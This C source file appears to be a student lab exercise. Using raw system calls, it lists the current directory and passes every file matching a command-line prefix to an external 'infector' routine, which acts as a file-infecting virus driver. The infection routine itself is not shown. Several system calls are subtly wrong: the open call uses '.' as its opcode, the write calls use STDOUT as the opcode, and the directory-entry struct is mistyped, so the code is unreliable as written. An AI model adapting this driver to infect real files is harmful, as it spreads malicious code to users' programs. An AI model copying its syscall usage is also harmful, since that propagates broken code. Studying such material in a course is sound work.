#include "util.h"

#define SYS_EXIT 1
#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_ISEEK 19
#define STDIN 0
#define STDOUT 1
#define STDERR 2
#define EOF 4
#define BUFFER_SIZE 8192

typedef struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char*          d_name;  /* Filename (null-terminated) */
                        /* length is actually (d_reclen - 2 -
                           offsetof(struct linuxma_dirent, d_name) */
} linux_dirent;

extern int system_call(int op_code, ...); 
extern void infection(int p);
extern void infector(char* p); 
 
/* given file descriptor - return the size of the file in bytes. */

int main (int argc , char* argv[], char* envp[]){
/*   int input_fd = STDIN; */
/*   int output_fd = STDOUT; */
  char buffer[BUFFER_SIZE];
  int  directory_fd;
  int prefix = 0;
  struct linux_dirent *dir; 
  int directory_size;

  int i;
  for(i = 1; i < argc; i++) 
    if(strncmp("-a", argv[i], 2) == 0) 
      prefix = 1;
  
  directory_fd = system_call('.', 0, 0777); /*opening current dir*/
  if (directory_fd < 0) {
    system_call(STDOUT,"File Opening Fail",17);
    return system_call(SYS_EXIT,0x55);
  }

  else {
    directory_size = system_call(141, directory_fd, buffer, BUFFER_SIZE); /*getting num of bytes readed in curr dir by sys_getdents*/
    system_call(STDOUT,itoa(directory_size),strlen(itoa(directory_size)));
    int curr_pos;
    for(curr_pos = 0; curr_pos < directory_size;){
      dir = (struct linux_dirent *)(buffer + curr_pos);
      if(prefix != 0){
        if(strncmp(dir->d_name, argv[prefix] + 2, strlen(argv[prefix] + 2)) == 0){
          system_call(STDOUT, dir->d_name, strlen(dir->d_name));
          system_call(STDOUT, "\n", 1);
          infector(dir->d_name);
        }
      }
      else{
        system_call(STDOUT, dir->d_name, strlen(dir->d_name));
        system_call(STDOUT, "\n", 1);
      }
      curr_pos += dir->d_reclen;
    }
  }

  return 0;
}